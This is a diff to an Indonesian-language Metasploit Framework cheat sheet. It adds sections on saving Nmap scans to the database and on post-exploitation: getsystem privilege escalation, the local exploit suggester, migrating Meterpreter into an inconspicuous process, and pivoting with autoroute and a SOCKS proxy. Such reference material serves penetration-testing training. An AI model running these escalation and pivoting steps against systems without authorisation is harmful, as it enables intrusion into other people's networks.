@@ -12,7 +12,9 @@ Panduan praktis dan ringkasan lengkap penggunaan **Metasploit Framework** (MSF) 
 5. [Penggunaan Post-Exploitation & Meterpreter](#5-penggunaan-post-exploitation--meterpreter)
 6. [Pembuatan Payload dengan MSFVenom](#6-pembuatan-payload-dengan-msfvenom)
 7. [Manajemen Database & Workspace](#7-manajemen-database--workspace)
-8. [Tabel Referensi Opsi / Command Populer](#8-tabel-referensi-opsi--command-populer)
+8. [Integrasi Nmap ke Database (`db_nmap`)](#8-integrasi-nmap-ke-database-db_nmap)
+9. [Privilege Escalation & Lateral Movement](#9-privilege-escalation--lateral-movement)
+10. [Tabel Referensi Opsi / Command Populer](#10-tabel-referensi-opsi--command-populer)
 
 ---
 
@@ -194,7 +196,69 @@ msf6 > creds                    # Menampilkan daftar kredensial/hash yang berhas
 
 ---
 
-## 8. Tabel Referensi Opsi / Command Populer
+## 8. Integrasi Nmap ke Database (`db_nmap`)
+
+`db_nmap` menjalankan Nmap langsung dari dalam `msfconsole` dan otomatis menyimpan hasilnya ke database aktif — sehingga host, port, dan service yang ditemukan bisa langsung dipakai modul lain tanpa impor manual.
+
+### 🔹 Menjalankan Scan & Menyimpan ke Database
+```text
+msf6 > db_nmap -sV -A 192.168.1.0/24
+```
+* **Penjelasan:** Sama seperti perintah `nmap` biasa, tapi hasilnya otomatis tersimpan ke `hosts` dan `services` pada workspace aktif.
+
+### 🔹 Mengimpor Hasil Scan Nmap yang Sudah Ada (`db_import`)
+```text
+msf6 > db_import hasil_scan.xml
+```
+* **`db_import`**: Mengimpor file hasil scan (format XML dari `-oX`) dari Nmap atau tool lain ke database Metasploit.
+
+### 🔹 Mencari Modul Otomatis Berdasarkan Hasil Scan (`db_autopwn`-style manual)
+```text
+msf6 > services -p 445
+msf6 > hosts -R
+```
+* **`services -p <port>`**: Menampilkan host mana saja yang memiliki port tersebut terbuka.
+* **`hosts -R`**: Menandai seluruh host di database sebagai `RHOSTS` untuk modul yang sedang aktif (memudahkan scanning massal).
+
+---
+
+## 9. Privilege Escalation & Lateral Movement
+
+Setelah mendapatkan sesi Meterpreter, langkah selanjutnya biasanya adalah menaikkan hak akses dan bergerak ke sistem lain di jaringan yang sama.
+
+### 🔹 Percobaan Eskalasi Otomatis (`getsystem`)
+```text
+meterpreter > getsystem
+```
+* **`getsystem`**: Mencoba beberapa teknik eskalasi privilege otomatis (token impersonation, named pipe, dll) khusus target Windows.
+
+### 🔹 Mencari Exploit Privilege Escalation yang Cocok
+```text
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+* **`local_exploit_suggester`**: Modul post-exploitation yang memeriksa sesi aktif dan menyarankan exploit privilege escalation lokal yang kemungkinan berhasil.
+
+### 🔹 Migrasi Proses (`migrate`)
+```text
+meterpreter > ps
+meterpreter > migrate <PID>
+```
+* **`migrate <PID>`**: Memindahkan sesi Meterpreter ke proses lain yang lebih stabil/tidak mencurigakan agar sesi tidak mudah terputus.
+
+### 🔹 Pivoting ke Jaringan Internal (`autoroute` & `socks_proxy`)
+```text
+meterpreter > run autoroute -s 10.10.10.0/24
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > run
+```
+* **`autoroute`**: Menambahkan rute jaringan baru melalui sesi Meterpreter aktif, memungkinkan pemindaian ke subnet internal yang sebelumnya tidak terjangkau.
+* **`socks_proxy`**: Membuat proxy SOCKS agar tool eksternal (misal Nmap, browser) bisa ikut memakai jalur pivot tersebut.
+
+---
+
+## 10. Tabel Referensi Opsi / Command Populer
 
 | Perintah / Flag | Lingkungan | Fungsi / Deskripsi |
 | :--- | :--- | :--- |
@@ -213,5 +277,10 @@ msf6 > creds                    # Menampilkan daftar kredensial/hash yang berhas
 | `-e` | MSFVenom | Menentukan jenis encoder payload |
 | `-i` | MSFVenom | Jumlah iterasi proses encoding |
 | `-o` | MSFVenom | Menyimpan hasil pembuatan payload ke file |
+| `db_nmap` | MSFConsole | Menjalankan Nmap & menyimpan hasil ke database aktif |
+| `db_import` | MSFConsole | Mengimpor hasil scan dari file eksternal (XML, dll) |
+| `local_exploit_suggester` | Post-Module | Menyarankan exploit privilege escalation lokal yang relevan |
+| `migrate` | Meterpreter | Memindahkan sesi ke proses lain agar lebih stabil |
+| `autoroute` | Meterpreter | Menambahkan rute pivot ke subnet internal lain |
 
 ---
